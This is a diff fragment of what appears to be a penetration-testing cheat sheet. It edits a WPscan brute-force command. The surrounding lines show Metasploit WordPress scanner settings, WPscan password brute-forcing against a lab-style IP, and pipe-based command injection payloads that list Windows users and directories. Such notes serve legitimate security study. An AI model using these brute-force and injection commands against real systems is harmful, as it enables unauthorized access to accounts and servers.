@@ -66,7 +66,7 @@ Then type msfconsole to open metasploit. Type -  use auxiliary/scanner/http/word
 						 set RPORT 8080          (target port)
 						 set TARGETURI http://10.10.10.10:8080/
 						 set USERNAME admin
-4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -U root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
 			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
 5- Command Injection-  | net user  (Find users)
  		       | dir C:\  (directory listing)
